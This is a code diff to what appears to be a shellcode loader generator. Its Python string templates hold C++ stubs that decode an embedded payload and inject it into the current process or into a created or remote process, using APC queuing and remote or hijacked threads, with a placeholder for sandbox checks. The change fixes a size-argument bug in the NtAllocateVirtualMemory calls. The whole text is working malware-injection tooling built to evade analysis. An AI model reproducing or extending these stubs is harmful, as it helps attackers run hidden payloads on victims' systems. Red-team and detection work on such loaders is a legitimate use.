@@ -29,7 +29,7 @@ typedef std::wstring String;
 
 REPLACE_ME_PAYLOAD
 
-unsigned int payload_len = sizeof(payload);
+SIZE_T payload_len = sizeof(payload);
 
 unsigned char* decoded = (unsigned char*)malloc(payload_len);
 
@@ -361,11 +361,12 @@ CurrentThread_stub = """
     PVOID base_addr = NULL;
     HANDLE thandle = NULL;
     SIZE_T bytesWritten;
+    SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
     deC(payload);
 
-    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (res != 0){
         std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
@@ -432,6 +433,7 @@ QueueUserAPC_stub = """
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
+    SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
     deC(payload);
@@ -453,7 +455,7 @@ QueueUserAPC_stub = """
     HANDLE hProcess = pi.hProcess;
     HANDLE hThread = pi.hThread;
 
-    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (res != 0){
         std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
@@ -513,6 +515,7 @@ RemoteThreadSuspended_stub = """
     HANDLE thandle = NULL;
     HANDLE hProcess = NULL;
     SIZE_T bytesWritten;
+    SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
     deC(payload);
@@ -543,7 +546,7 @@ RemoteThreadSuspended_stub = """
                     std::cout << "NtOpenProcess opened the target process sucessfully." << std::endl;
                 }
 
-                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
                 if (res != 0){
                     std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
@@ -619,6 +622,7 @@ RemoteThreadContext_stub = """
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
+    SIZE_T pnew = payload_len;
 
     REPLACE_ME_SANDBOX_CALL
     deC(payload);
@@ -639,7 +643,7 @@ RemoteThreadContext_stub = """
     
     HANDLE hProcess = pi.hProcess;
 
-    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (res != 0){
         std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
